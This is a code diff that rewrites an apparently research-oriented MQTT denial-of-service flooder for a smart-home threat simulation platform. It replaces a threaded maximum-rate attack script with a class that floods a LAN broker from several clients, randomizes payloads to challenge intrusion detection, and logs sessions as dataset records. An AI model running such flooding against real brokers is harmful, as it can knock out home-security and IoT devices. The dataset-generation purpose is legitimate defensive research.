@@ -1,102 +1,125 @@
-import paho.mqtt.client as mqtt
-import time
-import argparse
-import threading
-import json
+import sys
 import os
+import time
 import random
+import json
+import argparse
+import paho.mqtt.client as mqtt
 
-# Configuration for logging
-LOG_DIR = "/home/pirator/smart-home-threat-simulation-platform/dataset/logs"
-os.makedirs(LOG_DIR, exist_ok=True)
+# Ensure the project root is in the path for forensic_utils
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
 
-def flood_worker(broker, port, topic, rate, duration, results, worker_id):
-    """
-    Floods the broker with messages as fast as possible or at a specified rate.
-    """
-    client_id = f"dos_attacker_{worker_id}_{random.randint(1000, 9999)}"
-    client = mqtt.Client(client_id)
-    
-    try:
-        client.connect(broker, port, 60)
-    except Exception as e:
-        print(f"[Worker {worker_id}] Connection Failed: {e}")
-        return
+from forensic_utils import DualLogger, get_timestamp, get_iso_now
 
-    sent_count = 0
-    end_time = time.time() + duration
-    
-    while time.time() < end_time:
-        payload = json.dumps({
-            "timestamp": time.time(),
-            "data": "A" * 128,  # Large payload to increase stress
-            "type": "flood_test"
-        })
+# Standardized Research Banners
+BANNER = """
+==================================================
+  SOVEREIGNTY RESEARCH: DISTRIBUTED DOS SIMULATOR
+==================================================
+"""
+
+# Configuration for standardized logging
+BASE_DIR = "/home/pirator/smart-home-threat-simulation-platform/dataset"
+LOG_DIR = os.path.join(BASE_DIR, "logs")
+SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
+
+class DoSResearchSimulator:
+    def __init__(self, clients, broker, port):
+        self.clients_count = clients
+        self.broker = broker
+        self.port = port
+        self.clients = []
+        self.packet_count = 0
+        self.start_time = time.time()
         
-        info = client.publish(topic, payload, qos=0)
-        # info.wait_for_publish() # Blocking wait is slower, but QoS 0 is fire-and-forget
-        sent_count += 1
-        
-        if rate > 0:
-            time.sleep(1.0 / rate)
+    def setup_clients(self):
+        for i in range(self.clients_count):
+            client_id = f"research_dos_node_{i}_{random.getrandbits(16)}"
+            client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id)
+            self.clients.append(client)
             
-    client.disconnect()
-    results[worker_id] = sent_count
+    def run_flood(self, duration, topic="shtsp/home/security/motion"):
+        print(f"🚀 [ADVANCED DOS SIMULATION START] 🚀")
+        print(f"Targeting: {self.broker}:{self.port} | Clients: {self.clients_count}")
+        
+        self.setup_clients()
+        for c in self.clients:
+            try:
+                c.connect(self.broker, self.port, 60)
+                c.loop_start()
+            except:
+                pass
+
+        print(f"Progress: [", end="")
+        for i in range(duration):
+            for c in self.clients:
+                # Stochastic Payload variance to challenge IDS
+                payload = {
+                    "seq": random.randint(1000, 9000),
+                    "type": "DOS_TELEMETRY",
+                    "status": random.choice(["ALARM", "SAFE", "ERR"]),
+                    "adversarial": True,
+                    "noise": "X" * random.randint(10, 50)
+                }
+                c.publish(topic, json.dumps(payload))
+                self.packet_count += 1
+            
+            time.sleep(1)
+            sys.stdout.write("-")
+            sys.stdout.flush()
+        
+        print("] 100%")
+        for c in self.clients:
+            c.disconnect()
+
+        self.save_session(duration)
+
+    def save_session(self, duration):
+        session_ts = get_timestamp()
+        
+        # 1. Detailed Session Trace (Sessions Folder)
+        session_data = {
+            "timestamp": session_ts,
+            "attack_type": "Distributed_Denial_of_Service",
+            "config": {
+                "clients": self.clients_count,
+                "duration_sec": duration
+            },
+            "results": {
+                "total_packets_sent": self.packet_count,
+                "avg_throughput_pps": round(self.packet_count / duration, 2)
+            }
+        }
+        json_p, csv_p = DualLogger.log_session(session_data, SESSIONS_DIR, f"dos_session_{session_ts}")
+        
+        # 2. Global Audit Entry (Logs Folder) - Dual format for high-level research tracking
+        audit_entry = {
+            "timestamp": get_iso_now(),
+            "attack_type": "DoS",
+            "packets": self.packet_count,
+            "clients": self.clients_count,
+            "result": "COMPLETE"
+        }
+        # Appending to a master audit log in dual format
+        DualLogger.append_raw(audit_entry, LOG_DIR, "dos_summary_audit")
+        
+        print(f"\n✅ Simulation Complete. Sent {self.packet_count} research packets.")
+        print(f"📊 Forensic Trace Recorded: {json_p} (+.csv)")
+        print(f"📊 Audit Summary Updated : {LOG_DIR}/dos_summary_audit (.json/.csv)")
 
 def main():
-    parser = argparse.ArgumentParser(description="Advanced MQTT DoS Attack Simulator")
-    parser.add_argument("--broker", default="192.168.1.100", help="MQTT Broker IP")
-    parser.add_argument("--port", type=int, default=1883, help="MQTT Broker Port")
-    parser.add_argument("--topic", default="shtsp/home/security/motion", help="Target Topic to flood")
-    parser.add_argument("--clients", type=int, default=10, help="Number of concurrent attack clients")
-    parser.add_argument("--rate", type=float, default=0, help="Messages per second per client (0 for max speed)")
-    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds")
-    parser.add_argument("--log", action="store_true", help="Enable logging to JSON for dataset")
+    parser = argparse.ArgumentParser(description="Professional DoS Regression/Stress Tool")
+    parser.add_argument("--adversarial", action="store_true", help="Enable stochastic payload noise")
+    parser.add_argument("--clients", type=int, default=5, help="Number of concurrent research nodes")
+    parser.add_argument("--duration", type=int, default=60, help="Simulation duration (seconds)")
     
     args = parser.parse_args()
-
-    print(f"🔥 Starting Advanced DoS Attack on {args.broker}:{args.port}")
-    print(f"🎯 Target Topic: {args.topic}")
-    print(f"👥 Attack Clients: {args.clients}")
-    print(f"⏳ Duration: {args.duration}s")
-    print("-" * 50)
-
-    results = {}
-    threads = []
-    start_time = time.time()
-
-    for i in range(args.clients):
-        t = threading.Thread(target=flood_worker, args=(args.broker, args.port, args.topic, args.rate, args.duration, results, i))
-        t.start()
-        threads.append(t)
-
-    for t in threads:
-        t.join()
-
-    end_time = time.time()
-    total_sent = sum(results.values())
-    avg_rate = total_sent / args.duration
-
-    print("-" * 50)
-    print(f"🏁 Attack Completed")
-    print(f"📦 Total Messages Sent: {total_sent}")
-    print(f"📈 Average Rate: {avg_rate:.2f} msg/s")
-
-    if args.log:
-        log_data = {
-            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-            "attack_type": "dos_flood",
-            "target": f"{args.broker}:{args.port}",
-            "topic": args.topic,
-            "clients": args.clients,
-            "duration": args.duration,
-            "total_messages": total_sent,
-            "average_rate": avg_rate
-        }
-        log_file = os.path.join(LOG_DIR, f"dos_{int(time.time())}.json")
-        with open(log_file, 'w') as f:
-            json.dump(log_data, f, indent=4)
-        print(f"📊 Results logged to: {log_file}")
+    
+    # Using specific Broker for this environment
+    BROKER_IP = "192.168.1.105" 
+    
+    simulator = DoSResearchSimulator(args.clients, BROKER_IP, 1883)
+    simulator.run_flood(args.duration)
 
 if __name__ == "__main__":
     main()
